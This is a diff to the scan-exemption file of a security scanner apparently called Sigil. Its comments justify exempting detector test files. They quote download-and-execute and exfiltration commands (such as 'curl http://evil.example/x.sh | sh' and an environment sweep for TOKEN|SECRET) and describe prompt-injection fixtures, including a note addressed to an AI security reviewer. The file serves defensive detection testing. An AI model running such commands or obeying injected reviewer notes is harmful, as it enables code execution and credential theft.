@@ -82,6 +82,11 @@ api/tests/
 tests/fixtures/
 tests/regression/
 test-repo/
+# tests/marketplace/: same category. The marketplace validator parses SKILL.md
+# and agent YAML frontmatter, so its tests must write real "---" delimited
+# documents as fixture INPUT — that is the thing under test, not an injected
+# instruction. Every tree here is built under tmp_path and labelled synthetic.
+tests/marketplace/
 
 # ─────────────────────────────────────────────────────────────────────────────
 # (a7) The legacy bash scanner and its wrapper. bin/sigil's source IS the pattern
@@ -160,14 +165,72 @@ cli/src/scanner/normalize.rs
 cli/src/scanner/mod.rs
 # cli/src/scanner/context.rs: doc-comment example "eval(" in .d.ts files.
 cli/src/scanner/context.rs
+# cli/src/scanner/correlate.rs: the correlation engine. Its docs and its unit tests
+# quote the exfiltration shapes a chain links, as string literals (a curl that reads
+# its body from a heredoc, `curl --data-binary @- <<EOF`, and the requests a secret
+# is sent in), to prove the value reading links them; SKILL-017 reads each as an
+# upload. The module runs no command and sends nothing. Detection-engine test
+# inputs, not payloads.
+cli/src/scanner/correlate.rs
 # cli/src/corpus/ (F-008 Phase C): the declarative pack engine + signing module.
 # Its parity tests embed malicious sample strings as Rust literals (let contents =
 # "eval(compile(…))", requests.get("https://evil…")) to prove the engine detects
 # them, and signing.rs carries Ed25519 test-vector hex byte arrays (tripping the
 # hex-payload rule). Detection-engine test fixtures + crypto test vectors, not payloads.
 cli/src/corpus/engine.rs
+# cli/src/corpus/multilingual_tests.rs: INTL-001..004 pack tests. Same category as
+# engine.rs — each case is an injected instruction in another language beside a
+# benign sentence sharing its vocabulary. Detection-engine test inputs, not payloads.
+cli/src/corpus/multilingual_tests.rs
+# cli/src/corpus/guardrail_tests.rs: PROMPT-001/005 tests pairing guardrails that must stay
+# quiet with the injections they forbid. Detection-engine test inputs, not payloads.
+cli/src/corpus/guardrail_tests.rs
+# cli/src/transitive_tests.rs: --follow-refs tests. The injected fetcher returns
+# credential-exfiltration scripts and PE headers so the walk can be shown to
+# scan and flag them. Detection test inputs, never fetched or run.
+cli/src/transitive_tests.rs
 cli/src/corpus/loader.rs
 cli/src/corpus/signing.rs
+# cli/src/corpus/compiled.rs: the compiled-corpus path. Same category as
+# engine.rs above — its parity test (compiled_matches_uncompiled_engine) must
+# feed the engine real malicious strings (os.system('curl … | sh'),
+# eval(atob(…)), pickle.loads(base64.b64decode(…))) to prove the compiled and
+# uncompiled paths agree. Removing those fixtures would remove the guarantee
+# that the optimisation did not change detection behaviour.
+cli/src/corpus/compiled.rs
+# cli/src/corpus/agent_supply_chain_tests.rs: unit tests for the AGENTSC-* pack.
+# Same category as engine.rs — each test feeds the engine a line reduced from a
+# real malicious skill (a fake-prerequisite download link, a file-drop dropper
+# URL, an env sweep for TOKEN|SECRET, an XSS payload) to prove the rule fires,
+# next to the benign line it must leave alone. Test fixtures, not payloads.
+cli/src/corpus/agent_supply_chain_tests.rs
+# cli/src/corpus/mcp_fp_tests.rs: MCP-server calibration tests. Same category as
+# engine.rs — each test pairs a benign line from a registry MCP server with the
+# attack line the same rule must still report (an embedded base64 payload, a
+# URL-shortener cradle piped to iex, a live PEM key). Test fixtures, not payloads.
+cli/src/corpus/mcp_fp_tests.rs
+# cli/src/scanner/lifecycle_tests.rs: lifecycle-classifier tests. Same category
+# as mcp_fp_tests.rs — each test pairs a benign package.json / launcher shape
+# from a registry MCP server with the attack variants that must keep INSTALL-003,
+# INSTALL-004 or CODE-014 (a postinstall that loads child_process or reads
+# process.env, npx only-allow chained to curl | sh, a launcher that installs a
+# foreign package). Test fixtures, not payloads.
+cli/src/scanner/lifecycle_tests.rs
+# cli/src/corpus/exempt_tests.rs: match-local suppression tests. Synthetic rules
+# plus the call and definition shapes (exec(payload), def exec(self)) that pin
+# which matches an exemption may and may not drop. Test fixtures, not payloads.
+cli/src/corpus/exempt_tests.rs
+# cli/src/scanner/cloud_sigs.rs: cloud-signature engine. Its tests construct
+# signature patterns ("curl") and boundary-case match lines to pin the
+# multi-byte truncation fix and the phase-resolution contract.
+cli/src/scanner/cloud_sigs.rs
+# cli/src/scanner/derive.rs: the derived-analysis-unit module. Its whole
+# purpose is decoding embedded payloads, so its doc comment and tests must
+# contain real ones ("curl http://evil.example/x.sh | sh", base64-encoded and
+# plain) to prove a decoded payload actually reaches the other phases. The
+# scanner also decodes this file's own fixtures and re-reports them, which is
+# the module working correctly on itself.
+cli/src/scanner/derive.rs
 # cli/src/cache.rs and cli/src/ledger.rs: unit tests embed known-risk snippets
 # to prove cache invalidation and trust-ledger suppression do not hide changed
 # artifacts. The production modules remain covered by Rust unit tests.
@@ -175,6 +238,33 @@ cli/src/cache.rs
 cli/src/ledger.rs
 # cli/tests/explain.rs: CLI parser fixture contains JSON scan findings by design.
 cli/tests/explain.rs
+# cli/src/residue/checks.rs: its unit tests enumerate
+# download-and-execute command lines ("curl https://example.com/install.sh | sh",
+# "wget -qO- … | bash") as INPUT to the pre-tool-use hook and the residue
+# classifier, which must block them. (hook.rs's tests moved to hook_tests.rs, below.) NET-RCE-001 (fp-lane split of NET-012)
+# reports those literals at High, as it should for real code. Test inputs for
+# our own guards, not payloads; the production logic is covered by the modules'
+# Rust unit tests.
+cli/src/residue/checks.rs
+# cli/src/{hook,inventory,cmdline,ingest}_tests.rs: the unit tests of the
+# PreToolUse gate, the installed-tooling posture scan (sigil skills), the shared
+# command-line analysis and archive/URL ingest. They ARE the positive and
+# negative fixtures for those detectors: curl|sh pipelines, hooks that post
+# their event payload, fake ghp_/sk-ant- tokens, a reverse-shell one-liner in a
+# skill, tunnel hosts, the cloud-metadata address, zip-slip archives. The tests
+# were moved out of hook.rs / inventory.rs / cmdline.rs / ingest.rs so those
+# production files stay scanned.
+cli/src/hook_tests.rs
+cli/src/inventory_tests.rs
+cli/src/cmdline_tests.rs
+cli/src/ingest_tests.rs
+# cli/src/llm_review/tests.rs: the unit tests of the optional LLM review stage.
+# Its fixtures are what the stage must withstand: a note addressed to an AI
+# security reviewer (MANIP-012 must flag it and the stage must refuse to act on
+# a dismissal next to it) and an exec() line beside it. Secret-shaped values
+# are assembled at run time and are not in the file. The stage's production
+# code (mod.rs, mask.rs, prompt.rs, provider.rs) stays scanned.
+cli/src/llm_review/tests.rs
 
 # IDE / MCP integration source whose strings describe detected patterns.
 # plugins/mcp-server/src/index.ts: tool descriptions list eval/exec/pickle; execFile to run CLI.
@@ -245,3 +335,11 @@ scripts/transcript-backfill.cjs
 # This ignore file itself enumerates pattern/file names and therefore trips the
 # scanner. It is configuration, not product code.
 .sigilignore
+# evaluation_results/correlation_step/narrow_hop.patch: the narrow one-hop
+# follow, measured and not adopted (docs/detection/correlation-names.md). A diff
+# of cli/src/corpus/engine.rs and cli/src/scanner/correlate.rs, both listed
+# above: its hunks carry those files' test inputs (an exfiltration URL in a
+# test string, an environment sweep), which NET-007 and AGENTSC-010 read as the
+# patterns they are. Never applied or run by the build. Evaluation data, not
+# payloads.
+evaluation_results/correlation_step/narrow_hop.patch
